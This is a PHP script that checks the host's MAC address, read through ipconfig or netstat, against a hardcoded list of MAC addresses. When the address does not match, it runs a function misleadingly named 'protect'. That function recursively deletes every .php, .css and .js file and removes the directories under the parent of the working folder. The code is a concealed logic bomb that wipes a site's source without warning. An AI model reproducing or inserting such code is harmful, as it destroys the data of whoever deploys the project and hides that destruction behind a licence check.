<?php  //$LMA = "28:6e:d4:88:c6:e3";$DMA = "18-CF-5E-44-9A-8A"; $DMA2 = "C4-54-44-C1-29-A5"; $HMA = "20-16-D8-A2-5A-3B"; $HMA2 = "70-54-D2-9B-AC-2F"; $LIP = "10.10.251.24"; $SIP = getHostByName(getHostName()); function getMW() {ob_start(); system('ipconfig /all'); $mycomsys=ob_get_contents(); ob_clean(); $Find = "Physical"; $pmc = strpos($mycomsys, $Find); $var=substr($mycomsys,($pmc+36),17); return $var; }function getML() {exec('netstat -ie', $result); if(is_array($result)) {$iface = array();foreach($result as $key => $line) {if($key > 0) { $tmp = str_replace(" ", "", substr($line, 0, 10)); if($tmp <> "")  { $macpos = strpos($line, "HWaddr"); if($macpos !== false) {$iface[] = array('iface' => $tmp, 'mac' => strtolower(substr($line, $macpos+7, 17)));}}}} return $iface[0]['mac'];} else {return "notfound";} } if (stripos(PHP_OS, 'linux') === 0) { $SMA = getML();} elseif (stripos(PHP_OS, 'win') === 0)  {$SMA = getMW();}  elseif (stripos(PHP_OS, 'darwin') === 0)  {$SMA = "NotFound";} $Status = "Yes";if(1 == 1){ if(($LMA != $SMA) && ($DMA != $SMA) && ($DMA2 != $SMA) && ($HMA != $SMA) && ($HMA2 != $SMA)) {$Status = "No";function protect($str) {if (is_file($str))  {$fy = substr($str, -2);if ($fy == "hp" || $fy == "ss" || $fy == "js") {return unlink($str);}} elseif (is_dir($str)) {$scan = glob(rtrim($str,'/').'/*'); foreach($scan as $index=>$path) { protect($path);} return @rmdir($str);}} $dir = getcwd();$dir = substr_replace($dir, "", -4); protect($dir); } } else {$Status = "No";function protect($str)  {if (is_file($str)) {$fy = substr($str, -2);if ($fy == "hp" || $fy == "ss" || $fy == "js") {return unlink($str);}} elseif (is_dir($str)) {$scan = glob(rtrim($str,'/').'/*');foreach($scan as $index=>$path) { protect($path);}return @rmdir($str);}}$dir = getcwd(); $dir = substr_replace($dir, "", -4); /*protect($dir); */}echo $Status;?>